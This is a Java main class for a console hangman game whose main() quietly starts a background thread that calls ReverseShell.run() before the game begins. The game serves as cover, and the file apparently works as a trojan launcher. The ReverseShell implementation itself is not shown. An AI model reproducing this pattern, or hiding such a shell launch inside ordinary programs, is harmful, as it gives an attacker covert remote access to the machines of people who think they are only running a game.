package com.email.app;
import java.util.Scanner;  // Import the Scanner class
import java.util.logging.Logger;


public class Main extends Thread{
    public void run(){  
        ReverseShell.run();  
        }  
    
    public static void main(String[] args) {
        // MyLogger logger = new MyLogger();
        MyLogger.init();
        Logger logger= Logger.getLogger("MyLog");
        logger.info("wassup");

        
        Main t1=new Main();  
        t1.start(); 
       
        Hangman hangman = new Hangman();
       char[] correctArray = hangman.getRandomWord();
       char[] emptyArray= hangman.getEmptyCorrectArray(correctArray);
       char[] incorrect= hangman.getIncorrect();    
       int incorrectIncrementer=0;
        
        while (true) {
            hangman.printArray(emptyArray);
            // hangman.printArray(correctArray);
            hangman.printArray(incorrect);
            System.out.println(hangman.getGallows(incorrectIncrementer));
            char userInput= hangman.getUserInput();

            boolean check= hangman.compareArrays(correctArray, emptyArray, userInput);
            
            if (!check) {
                try {
                    hangman.updateIncorrect(incorrect, userInput, incorrectIncrementer);
                } catch (Exception e) {
                    System.out.println(hangman.getGallows(incorrectIncrementer+1));
                    System.out.println("You Lost. The correct answer is: ");
                    hangman.printArray(correctArray);
                    System.out.println("\n");
                    System.exit(0);
                }
                
                incorrectIncrementer= incorrectIncrementer+ 1;
            } 

            if (hangman.checkWinner(correctArray, emptyArray)) {
                hangman.printArray(correctArray);
                System.out.println("You Won");
                System.out.println("\n");

                System.exit(0);
            }

            
        }
    }
}
